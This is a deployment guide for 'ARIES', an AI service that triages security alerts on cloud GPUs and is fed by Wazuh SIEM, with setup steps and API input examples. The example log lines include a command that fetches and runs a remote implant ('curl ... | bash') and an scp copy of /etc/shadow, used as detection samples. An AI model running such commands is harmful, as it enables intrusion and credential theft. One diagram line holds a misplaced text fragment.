# ARIES — Cloud GPU Deployment Guide

> **Goal**: Deploy the FastAPI AI inference service on a cheap cloud GPU so that
> Wazuh alerts and direct API calls can reach the ARIES models from your laptop or
> the Wazuh server, without needing a local GPU.

---

## Table of Contents

1. [Cheapest GPU Cloud Options](#1-cheapest-gpu-cloud-options)
2. [What Changed in This Repo](#2-what-changed-in-this-repo)
3. [Architecture Overview](#3-architecture-overview)
4. [Step-by-Step Deployment](#4-step-by-step-deployment)
5. [Connecting Wazuh to the Cloud Service](#5-connecting-wazuh-to-the-cloud-service)
6. [Direct API Call Format & Model Input Requirements](#6-direct-api-call-format--model-input-requirements)
7. [How This Fits the Bigger SOAR Platform](#7-how-this-fits-the-bigger-soar-platform)
8. [When the Optimized Summarizer Arrives](#8-when-the-optimized-summarizer-arrives)

---

## 1. Cheapest GPU Cloud Options

The service needs at minimum **4 GB VRAM** for the Q4 GGUFs, 8 GB recommended.

| Provider | Instance | VRAM | Approx. cost | Notes |
|---|---|---|---|---|
| **Vast.ai** | RTX 3080 spot | 10 GB | ~$0.10–0.20/hr | **Cheapest overall**, spot market, community GPUs |
| **RunPod.io** | RTX 3090 community | 24 GB | ~$0.20–0.30/hr | Easy Docker deploy, persistent volumes |
| **Lambda Labs** | A10 on-demand | 24 GB | ~$0.60/hr | More stable, no spot preemption |
| **Google Cloud** | T4 spot (g4dn) | 16 GB | ~$0.15/hr | GCP credits friendly |
| **AWS EC2** | g4dn.xlarge spot | 16 GB | ~$0.15/hr | Good if you have AWS credits |

**Recommendation for this project**: Start with **RunPod.io** — it has a one-click
Docker template UI, persistent volumes for model files, and an exposed public HTTPS
URL with no extra configuration.

---

## 2. What Changed in This Repo


### `apps/fastapi_service/docker-compose.yml`
- GGUF volume mounts updated to source from `models/optimized/` instead of the old `models/onnx/triage_slm/`
- `ARIES_SLM_SUMMARIZER_MODEL_PATH` set to `""` so the service falls back to the ONNX summarizer until the optimized summarizer GGUF arrives

---

## 3. Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│  Wazuh SIEM (your server / VM)                                      │
│   integratord → custom-aries.py                                     │
│        │  POST /ingest/siem?vendor=wazuh                            │
│        ▼                                                            │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │  ARIES FastAPI Service  (Cloud GPU — RunPod / Vast.ai)         │ │
│  │                                                                │ │
│  │  /ingest/siem  →  Kafka(alerts.raw)                           │ │
│  │                         │                                     │ │
│  │           TriageKafkaConsumer (background)                    │ │
│  │                         │             the triage GGUF path as a stand-in until the dedicated summarizer GGUF arrives (same Phi-3-mini base, works well for summarization)
│  │          triage_slm_q4.gguf  (llama-cpp, GPU offload)         │ │
│  │          ner_slm_q4.gguf     (llama-cpp, GPU offload)         │ │
│  │          ONNX summarizer     (onnxruntime, CPU fallback)       │ │
│  │                         │                                     │ │
│  │   Kafka(alerts.enriched) → Conductor / SOAR Orchestrator      │ │
│  │                                                                │ │
│  │  Redis (cache) · PostgreSQL (case store) · MinIO (artifacts)  │ │
│  └────────────────────────────────────────────────────────────────┘ │
│                                                                     │
│  SOAR Conductor (your laptop / another cloud VM)                    │
│   polls alerts.enriched → creates cases, runs playbooks            │
└─────────────────────────────────────────────────────────────────────┘
```

The FastAPI service is the **only** component that needs a GPU. Everything else
(Kafka, Redis, Postgres, the SOAR conductor) can run on cheap CPU VMs or even
locally on your laptop.

---

## 4. Step-by-Step Deployment

### Step 1 — Upload the GGUF models to cloud storage

The GGUF files are too large to bake into a Docker image. Upload them to an
object store that your cloud instance can reach at startup.

**Option A: Backblaze B2 (free 10 GB, cheapest)**
```bash
# Install b2 CLI
pip install b2

# Authenticate
b2 authorize-account <keyID> <applicationKey>

# Create a bucket
b2 create-bucket aries-models allPrivate

# Upload the two GGUFs
b2 upload-file aries-models models/optimized/triage/triage_slm_q4.gguf triage_slm_q4.gguf
b2 upload-file aries-models models/optimized/ner/ner_slm_q4.gguf ner_slm_q4.gguf

# Also upload the ONNX fallbacks (optional but recommended)
b2 upload-file aries-models models/onnx/triage.onnx triage/triage.onnx
b2 upload-file aries-models models/onnx/triage_encoder.pkl triage/triage_encoder.pkl
b2 upload-file aries-models models/onnx/ner.opt.onnx ner/ner.opt.onnx
# (upload ner tokenizer files individually from models/ner/)
b2 upload-file aries-models models/onnx/summarizer/encoder.onnx summarizer/encoder.onnx
b2 upload-file aries-models models/onnx/summarizer/decoder.onnx summarizer/decoder.onnx
```

**Option B: Just `scp` them to the cloud instance** after creating it (simpler for
a one-off deployment, skip for RunPod which has persistent volumes).

### Step 2 — Create a RunPod instance

1. Go to [runpod.io](https://runpod.io) → **Deploy** → **GPU Pods**
2. Select **Community Cloud** → filter by **RTX 3090** or **RTX 3080** (~$0.20/hr)
3. Choose template: **RunPod PyTorch** (has nvidia-container-toolkit pre-installed)
4. Set **Container Disk**: 20 GB (for the Docker image)
5. Set **Volume Disk**: 10 GB (for model files, persists across restarts)
6. Set volume mount path: `/runpod-volume`
7. Expose port **8000** (HTTP)
8. Click **Deploy**

### Step 3 — SSH into the instance and upload models

RunPod gives you an SSH command in the UI. Once connected:

```bash
# If you used Backblaze B2 (or any S3-compatible store):
pip install b2
b2 authorize-account <keyID> <applicationKey>
b2 sync b2://aries-models/ /runpod-volume/aries_models/

# Verify
ls /runpod-volume/aries_models/
# triage_slm_q4.gguf  ner_slm_q4.gguf  triage/  ner/  summarizer/
```

### Step 4 — Set environment variables on RunPod

In RunPod → **My Pods** → **Edit Pod** → **Environment Variables**, add:

```
ARIES_USE_SLM=true
ARIES_SLM_MODEL_PATH=/runpod-volume/aries_models/triage_slm_q4.gguf
ARIES_SLM_NER_MODEL_PATH=/runpod-volume/aries_models/ner_slm_q4.gguf
ARIES_SLM_SUMMARIZER_MODEL_PATH=/runpod-volume/aries_models/triage_slm_q4.gguf
ARIES_LOG_LEVEL=INFO
```

> **Note**: Kafka, Postgres, MinIO, and Redis are set to localhost in `start_runpod.sh`.
> The service degrades gracefully when they're unreachable — all HTTP inference
> endpoints (`/triage`, `/nlp/ner`, `/nlp/summarize`) still work fine.

### Step 5 — Install dependencies and start the service

> **Why not `docker build`?** RunPod pods *are* Docker containers. Nested Docker
> (`docker build` inside a pod) is not available. We install directly into the pod's
> Python environment instead.

```bash
# Clone the repo
git clone https://github.com/MuhammadTahaSalaar/Aries.git /workspace/Aries
cd /workspace/Aries/apps/fastapi_service

# Install llama-cpp-python with CUDA FIRST (must precede requirements.txt)
CMAKE_ARGS="-DGGML_CUDA=on" pip install llama-cpp-python --force-reinstall --no-cache-dir

# Install all other dependencies
pip install -r requirements.txt

# Start the service
bash start_runpod.sh
```

Or use the all-in-one setup script:
```bash
cd /workspace/Aries/apps/fastapi_service
bash setup_runpod.sh   # installs everything
bash start_runpod.sh   # starts uvicorn
```

### Step 6 — Verify GPU is being used

```bash
# In a second RunPod terminal
python -c "
from llama_cpp import Llama
llm = Llama('/runpod-volume/aries_models/triage_slm_q4.gguf', n_gpu_layers=-1, n_ctx=512)
print('GPU offload active')
"

# Watch GPU utilisation while making a test request
nvidia-smi dmon -s u &
curl -s http://localhost:8000/health
```

### Step 7 — Get your public URL

RunPod exposes a public HTTPS URL for each exposed port:
```
https://<pod-id>-8000.proxy.runpod.net
```

Test it:
```bash
curl https://<pod-id>-8000.proxy.runpod.net/health
```

---

## 5. Connecting Wazuh to the Cloud Service

### On your Wazuh Manager

Edit `/var/ossec/etc/ossec.conf` — add or update the ARIES integration block:

```xml
<integration>
  <name>custom-aries</name>
  <hook_url>https://<pod-id>-8000.proxy.runpod.net/ingest/siem?vendor=wazuh</hook_url>
  <api_key>YOUR_SECRET_KEY</api_key>
  <level>3</level>
  <alert_format>json</alert_format>
</integration>
```

Set the environment variable the integration script reads:
```bash
echo 'ARIES_INGESTION_URL=https://<pod-id>-8000.proxy.runpod.net/ingest/siem?vendor=wazuh' \
  >> /var/ossec/etc/local_internal_options.conf
```

Copy the integration scripts (already in this repo):
```bash
cp wazuh-integration/custom-aries  /var/ossec/integrations/custom-aries
cp wazuh-integration/custom-aries.py /var/ossec/integrations/custom-aries.py
chmod 750 /var/ossec/integrations/custom-aries
chown root:wazuh /var/ossec/integrations/custom-aries*
```

Restart Wazuh:
```bash
systemctl restart wazuh-manager
```

### How the data flows

```
Wazuh alert fires
    │
    ▼
integratord calls /var/ossec/integrations/custom-aries (bash wrapper)
    │
    ▼
custom-aries.py reads alert JSON from temp file
    │  wraps in ARIES envelope: {"vendor":"wazuh","tenant_id":"..","raw":alert}
    ▼
POST https://<pod>/ingest/siem?vendor=wazuh
    │
    ▼
ARIES FastAPI /ingest/siem router
    │  normalises Wazuh fields → ARIES Alert schema
    ▼
publishes to Kafka topic: alerts.raw
    │
    ▼
TriageKafkaConsumer (background task in FastAPI)
    │  calls triage endpoint internally
    ▼
llama-cpp SLM (triage_slm_q4.gguf, GPU)
    │  returns: severity score, triage label, confidence
    ▼
publishes enriched alert to Kafka: alerts.enriched
    │
    ▼
SOAR Conductor polls alerts.enriched → creates incident cases
```

---

## 6. Direct API Call Format & Model Input Requirements

### 6.1 Triage — `/triage/predict`

**What the model needs for best results:**

The triage SLM (Phi-3-mini Q4, fine-tuned on cybersecurity logs) performs best
when the log line includes:

- The **severity/level** word (`CRIT`, `WARN`, `ERROR`, `INFO`)
- A **timestamp**
- The **source process** (e.g., `sshd`, `kernel`, `bash`)
- The **IP addresses** involved (source and destination)
- The **action** taken (e.g., `Failed password`, `Accepted publickey`, `executed`)
- Any **file paths** or **commands** executed

**Minimal input** (works but lower accuracy):
```json
POST /triage/predict
{
  "tenant_id": "acme-corp",
  "log_lines": [
    "WARN sshd[5678]: Failed password for root from 5.188.206.26 port 41022"
  ]
}
```

**Optimal input** (include all context lines together):
```json
POST /triage/predict
{
  "tenant_id": "acme-corp",
  "log_lines": [
    "WARN 2024-03-20T08:15:44Z sshd[5678]: Failed password for root from 5.188.206.26 port 41022",
    "WARN 2024-03-20T08:15:45Z sshd[5679]: Failed password for root from 5.188.206.26 port 41023",
    "WARN 2024-03-20T08:15:46Z sshd[5680]: Failed password for root from 5.188.206.26 port 41024",
    "CRIT 2024-03-20T08:16:01Z sshd[5700]: Accepted password for root from 5.188.206.26 port 41099",
    "CRIT 2024-03-20T08:16:04Z bash[5701]: root executed: curl http://5.188.206.26/implant.sh | bash"
  ],
  "asset_context": {
    "hostname": "prod-web-01",
    "asset_criticality": "high",
    "role": "web-server"
  }
}
```

**Response:**
```json
{
  "severity": "critical",
  "score": 0.94,
  "triage_label": "brute_force_followed_by_compromise",
  "confidence": 0.91,
  "recommended_action": "isolate",
  "reasoning": "Multiple failed SSH attempts followed by successful root login and immediate command execution suggest a successful brute-force attack with post-exploitation."
}
```

---

### 6.2 NER (IoC Extraction) — `/nlp/ner`

**What the model needs for best results:**

- Raw log lines or alert text (not pre-parsed JSON)
- Include IP addresses, domains, file paths, hashes — the model will tag them
- Longer context (up to 512 tokens) extracts more entities

**Input format:**
```json
POST /nlp/ner
{
  "tenant_id": "acme-corp",
  "text": "root executed: curl http://5.188.206.26/implant.sh | bash && chmod +x /tmp/.x && /tmp/.x & scp admin@192.168.1.10:/etc/shadow /tmp/dump.txt"
}
```

**Response:**
```json
{
  "entities": [
    {"text": "5.188.206.26", "label": "IP_ADDRESS", "start": 22, "end": 34},
    {"text": "http://5.188.206.26/implant.sh", "label": "URL", "start": 22, "end": 52},
    {"text": "/tmp/.x", "label": "FILE_PATH", "start": 80, "end": 87},
    {"text": "192.168.1.10", "label": "IP_ADDRESS", "start": 98, "end": 110},
    {"text": "/etc/shadow", "label": "FILE_PATH", "start": 111, "end": 122},
    {"text": "/tmp/dump.txt", "label": "FILE_PATH", "start": 123, "end": 136}
  ]
}
```

**Entity labels the model recognises:**
`IP_ADDRESS`, `DOMAIN`, `URL`, `FILE_PATH`, `HASH_MD5`, `HASH_SHA256`,
`CVE_ID`, `MALWARE_NAME`, `TOOL_NAME`, `VULNERABILITY`, `SYSTEM_CALL`,
`USERNAME`, `EMAIL`

---

### 6.3 Summarization — `/nlp/summarize`

**Two modes:**

| Mode | Max output | Best for |
|---|---|---|
| `executive` | ~100 tokens | SOC manager dashboard, one-paragraph summary |
| `analyst` | ~400 tokens | Full technical summary for an analyst |

**What the model needs for best results:**

- Multiple related log lines (not just one) — context is everything for summarization
- Include the full attack chain if available (brute force → compromise → exfil)
- Timestamp and severity prefixes help the model understand chronology

**Input format:**
```json
POST /nlp/summarize
{
  "tenant_id": "acme-corp",
  "mode": "executive",
  "text": "WARN 2024-03-20T08:15:44Z sshd[5678]: Failed password for root from 5.188.206.26 port 41022\nWARN 2024-03-20T08:15:45Z sshd[5679]: Failed password for root from 5.188.206.26 port 41023\nCRIT 2024-03-20T08:16:01Z sshd[5700]: Accepted password for root from 5.188.206.26 port 41099\nCRIT 2024-03-20T08:16:04Z bash[5701]: root executed: curl http://5.188.206.26/implant.sh | bash"
}
```

**Response:**
```json
{
  "summary": "A brute-force SSH attack from 5.188.206.26 successfully compromised root access on the target host. The attacker immediately downloaded and executed a remote implant, indicating an active intrusion.",
  "mode": "executive",
  "token_count": 42
}
```

---

### 6.4 Wazuh Alert Ingestion — `/ingest/siem`

This is the endpoint Wazuh calls automatically. You can also call it manually to
simulate an alert:

```json
POST /ingest/siem?vendor=wazuh
X-Tenant-ID: acme-corp
Content-Type: application/json

{
  "id": "1710921361.44709",
  "timestamp": "2024-03-20T08:16:01.000+0000",
  "rule": {
    "id": "5710",
    "level": 10,
    "description": "sshd: Attempt to login using a non-existent user"
  },
  "agent": {
    "id": "001",
    "name": "prod-web-01",
    "ip": "192.168.1.50"
  },
  "data": {
    "srcip": "5.188.206.26",
    "dstuser": "root"
  },
  "full_log": "CRIT 2024-03-20T08:16:01Z sshd[5700]: Accepted password for root from 5.188.206.26 port 41099"
}
```

**Important fields for best triage accuracy:**

| Field | Why it matters |
|---|---|
| `rule.level` | Wazuh severity level (1–15); used as a prior for triage scoring |
| `rule.description` | Human-readable rule description; fed directly to the SLM |
| `full_log` | The raw log line; most important field for the SLM |
| `agent.name` | Used to look up asset criticality in the SOAR asset register |
| `data.srcip` | Source IP; NER will tag it and check it against threat intel |

---

## 7. How This Fits the Bigger SOAR Platform

```
┌──────────────────────────────────────────────────────────────────┐
│  Data Sources                                                    │
│  Wazuh SIEM ──────────────────────────────────────────────────┐  │
│  Firewall / IDS logs (future)                                  │  │
│  API call logs (FastAPI request logs → Kafka)                  │  │
└────────────────────────────────────────────────────────────────┼──┘
                                                                 │
                          POST /ingest/siem                      │
                                                                 ▼
┌──────────────────────────────────────────────────────────────────┐
│  ARIES FastAPI Service (Cloud GPU)                               │
│                                                                  │
│  ┌─────────────┐  ┌──────────────┐  ┌──────────────────────┐    │
│  │  Triage SLM │  │   NER SLM    │  │  Summarizer (ONNX)   │    │
│  │ (GGUF, GPU) │  │ (GGUF, GPU)  │  │  (CPU fallback)      │    │
│  └─────────────┘  └──────────────┘  └──────────────────────┘    │
│         │                │                    │                  │
│         └────────────────┴────────────────────┘                 │
│                          │                                       │
│               Kafka: alerts.enriched                             │
└──────────────────────────┼───────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│  SOAR Conductor (conductor/)                                     │
│  - Consumes alerts.enriched from Kafka                           │
│  - Creates incident cases in PostgreSQL                          │
│  - Runs automated playbooks (isolate host, block IP, etc.)       │
│  - Exposes case management REST API to the Dashboard UI          │
└──────────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│  Dashboard UI (future / separate service)                        │
│  - Shows enriched alerts with AI triage scores                   │
│  - Displays IoCs extracted by NER                                │
│  - Shows executive/analyst summaries                             │
│  - Allows analyst feedback (fed back via ml.feedback Kafka topic)│
└──────────────────────────────────────────────────────────────────┘
```

**API call logs**: The FastAPI service itself emits structured JSON logs. To send
these to Wazuh for monitoring, configure a Wazuh agent on the cloud instance and
point it at the Docker container log:

```xml
<!-- /var/ossec/etc/ossec.conf on the cloud GPU instance -->
<localfile>
  <log_format>json</log_format>
  <location>/var/lib/docker/containers/<container-id>/*-json.log</location>
</localfile>
```

---

## 8. When the Optimized Summarizer Arrives

Once you copy `models/optimized/summarizer/summarizer_slm_q4.gguf` from Hydra:

1. **Uncomment** the volume mount in [apps/fastapi_service/docker-compose.yml](../apps/fastapi_service/docker-compose.yml):
   ```yaml
   - ../../models/optimized/summarizer/summarizer_slm_q4.gguf:/tmp/aries_models/slm/summarizer_slm_q4.gguf:ro
   ```

2. **Set** the env var:
   ```yaml
   ARIES_SLM_SUMMARIZER_MODEL_PATH: /tmp/aries_models/slm/summarizer_slm_q4.gguf
   ```

3. Upload it to your cloud volume and redeploy:
   ```bash
   b2 upload-file aries-models models/optimized/summarizer/summarizer_slm_q4.gguf summarizer_slm_q4.gguf
   # on the cloud instance:
   b2 sync b2://aries-models/ /runpod-volume/aries_models/
   docker restart aries_fastapi
   ```

The service will automatically use the GGUF summarizer instead of the ONNX fallback.
